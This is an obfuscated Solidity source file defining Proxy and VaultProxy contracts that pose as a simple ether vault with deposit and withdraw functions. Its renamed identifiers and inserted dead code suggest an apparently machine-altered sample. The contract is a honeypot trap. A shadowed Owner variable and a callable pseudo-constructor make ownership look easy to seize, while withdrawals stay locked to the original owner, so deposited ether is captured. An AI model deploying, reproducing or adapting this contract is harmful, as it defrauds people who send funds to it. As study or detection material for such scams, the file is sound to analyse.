// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

contract Proxy  {
    modifier _0x3fc89c { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function _0x18a441(address _0x93a12d) public _0x3fc89c {
        bool _flag1 = false;
        if (false) { revert(); } Owner = _0x93a12d; }
    function _0x712d60(address _0xd07d50, bytes data) public payable {
        if (false) { revert(); }
        uint256 _unused4 = 0;
        _0xd07d50.call.value(msg.value)(data);
    }
}

contract VaultProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function Vault() public payable {
        if (msg.sender == tx.origin) {
            if (1 == 1) { Owner = msg.sender; }
            _0x4a605f();
        }
    }

    function _0x4a605f() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function _0x3d7ab5(uint256 _0x16460b) public _0x3fc89c {
        if (_0x16460b>0 && Deposits[msg.sender]>=_0x16460b) {
            msg.sender.transfer(_0x16460b);
        }
    }
}